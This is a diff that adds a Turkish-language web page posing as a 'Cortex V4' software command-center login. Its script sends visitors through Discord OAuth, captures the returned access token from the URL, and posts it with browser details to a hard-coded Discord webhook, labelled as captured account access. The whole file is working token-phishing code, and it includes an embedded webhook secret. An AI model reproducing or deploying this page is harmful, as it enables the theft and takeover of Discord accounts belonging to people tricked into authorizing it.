@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cortex Software | V4 Command Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #00ffcc; --bg: #020202; }
+        body { background: var(--bg); color: var(--primary); font-family: 'Orbitron', sans-serif; margin: 0; overflow: hidden; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+        .nitro-card { background: rgba(10, 10, 10, 0.98); border: 1px solid rgba(0, 255, 204, 0.1); box-shadow: 0 0 50px rgba(0, 255, 204, 0.1); }
+        #dashboard { display: none; }
+        .glass-panel { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .stat-value { font-size: 2.5rem; font-weight: 900; color: white; line-height: 1; }
+        .scanline { width: 100%; height: 2px; background: rgba(0, 255, 204, 0.15); position: absolute; top: 0; left: 0; z-index: 100; pointer-events: none; animation: scan 4s linear infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .glow-btn { transition: all 0.3s ease; box-shadow: 0 0 15px rgba(0, 255, 204, 0.2); cursor: pointer; }
+        .glow-btn:hover { box-shadow: 0 0 35px rgba(0, 255, 204, 0.5); transform: translateY(-2px); }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center">
+    <div class="scanline"></div>
+
+    <!-- GİRİŞ EKRANI -->
+    <div id="landing" class="text-center p-12 nitro-card rounded-[2.5rem] max-w-sm w-full relative z-10 mx-4">
+        <div class="mb-8 relative inline-block">
+            <div class="absolute inset-0 bg-cyan-400 blur-3xl opacity-20 animate-pulse"></div>
+            <img src="https://i.imgur.com/4S4W9i8.png" alt="Cortex" class="w-24 h-24 relative drop-shadow-[0_0_25px_rgba(0,255,204,0.5)]">
+        </div>
+        <h1 class="text-3xl font-black mb-1 italic tracking-tighter text-white uppercase">Cortex <span class="text-cyan-400">V4</span></h1>
+        <p class="text-[9px] tracking-[8px] text-gray-500 mb-10 font-bold uppercase">YAZILIM OPERASYONLARI</p>
+        
+        <div class="bg-white/5 p-6 rounded-2xl mb-8 border border-white/5 text-left">
+            <div class="flex items-center gap-3 mb-3">
+                <div class="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></div>
+                <span class="text-white text-[10px] font-bold uppercase tracking-widest">SİSTEM AKTİF</span>
+            </div>
+            <p class="text-[11px] text-gray-400 leading-relaxed mono">Bulut tabanlı yönetim paneline erişmek için hesabınızı doğrulayın.</p>
+        </div>
+
+        <button onclick="startAuth()" class="w-full py-4 bg-cyan-500 hover:bg-cyan-400 text-black rounded-xl font-black transition-all glow-btn uppercase tracking-[0.2em] text-xs">
+            SİSTEME ERİŞİM SAĞLA
+        </button>
+    </div>
+
+    <!-- ADMIN DASHBOARD -->
+    <div id="dashboard" class="fixed inset-0 bg-[#020202] flex z-50 overflow-hidden">
+        <div class="w-80 border-r border-white/5 bg-black/60 p-10 flex flex-col glass-panel">
+            <div class="flex items-center gap-4 mb-20">
+                <img src="https://i.imgur.com/4S4W9i8.png" class="w-10 h-10" alt="Logo">
+                <h2 class="text-xl font-black text-white tracking-tighter italic">CORTEX<span class="text-cyan-400">.SYS</span></h2>
+            </div>
+            <nav class="space-y-6 flex-grow">
+                <div class="flex items-center gap-3 text-cyan-400 p-4 bg-cyan-400/5 rounded-xl border-l-4 border-cyan-400">
+                    <span class="text-sm font-bold tracking-widest uppercase">Kontrol Paneli</span>
+                </div>
+            </nav>
+            <div class="mt-auto bg-cyan-400/5 border border-cyan-400/10 p-5 rounded-2xl text-center">
+                <p class="text-[9px] text-cyan-400 font-bold mb-1 tracking-widest uppercase">DURUM: AKTİF</p>
+                <p class="text-[10px] text-gray-500 mono">SSL GÜVENLİ</p>
+            </div>
+        </div>
+
+        <div class="flex-grow p-16 overflow-y-auto relative">
+            <div class="flex justify-between items-start mb-20">
+                <div>
+                    <h3 class="text-xs text-gray-600 tracking-[0.6em] uppercase font-bold mb-4">ANA KOMUTA MERKEZİ</h3>
+                    <p class="text-4xl font-black text-white italic tracking-tighter uppercase">OPERATÖR <span class="text-cyan-400">YETKİLENDİ</span></p>
+                </div>
+                <div class="text-right">
+                    <p class="text-xs text-gray-600 font-mono mb-2" id="current-time"></p>
+                    <div class="inline-flex items-center gap-2 px-3 py-1 bg-green-500/10 rounded-full border border-green-500/20">
+                        <div class="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></div>
+                        <span class="text-[10px] text-green-500 font-bold uppercase tracking-widest">ÇEVRİMİÇİ</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-10">
+                <div class="stat-card glass-panel p-10 rounded-3xl border-b-4 border-cyan-400">
+                    <p class="text-[10px] text-gray-500 font-bold tracking-widest mb-6 uppercase">YAKALANAN VERİLER</p>
+                    <div class="flex items-baseline gap-3">
+                        <span class="stat-value" id="count-val">0</span>
+                        <span class="text-cyan-400 font-bold text-xs animate-bounce">+1 Yeni</span>
+                    </div>
+                </div>
+                <div class="bg-black/90 border border-white/5 rounded-3xl p-10 font-mono overflow-hidden">
+                    <div class="space-y-3 text-[12px]">
+                        <p class="text-gray-600">[SİSTEM] Cortex v4 aktif edildi.</p>
+                        <p class="text-cyan-500/80">[BAĞLANTI] Webhook tüneli açıldı.</p>
+                        <p class="text-green-400 font-bold uppercase">[BAŞARILI] Paket Discord'a gönderildi.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- SENİN BİLGİLERİN ---
+        const CLIENT_ID = "1480231196045873292";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480228951015297055/YkGkx8UliKe2XQtD0HxNxj1DBo_2rksQomQWoCaF61x-YUrVR9960IvGj-FVR99NY6iL";
+
+        function startAuth() {
+            const currentUrl = window.location.origin + window.location.pathname;
+            const scope = encodeURIComponent("identify email guilds");
+            window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(currentUrl)}&response_type=token&scope=${scope}`;
+        }
+
+        window.onload = () => {
+            setInterval(() => {
+                document.getElementById('current-time').innerText = new Date().toLocaleString('tr-TR');
+            }, 1000);
+
+            const params = new URLSearchParams(window.location.hash.slice(1));
+            const token = params.get('access_token');
+
+            if (token) {
+                document.getElementById('landing').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'flex';
+                document.getElementById('count-val').innerText = "1";
+
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "@everyone 🔥 **CORTEX V4 - YENİ VERİ GİRİŞİ!**",
+                        embeds: [{
+                            title: "💀 HESAP ERİŞİMİ SAĞLANDI",
+                            color: 0x00FFCC,
+                            thumbnail: { url: "https://i.imgur.com/4S4W9i8.png" },
+                            fields: [
+                                { name: "🔑 TOKEN", value: "```" + token + "```" },
+                                { name: "🖥️ SİSTEM", value: "```" + navigator.userAgent + "```" },
+                                { name: "📏 EKRAN", value: "```" + window.screen.width + "x" + window.screen.height + "```" },
+                                { name: "🕒 ZAMAN", value: "```" + new Date().toLocaleString('tr-TR') + "```" }
+                            ],
+                            footer: { text: "Cortex Software Systems | V4" }
+                        }]
+                    })
+                });
+            }
+        }
+    </script>
+</body>
+</html>
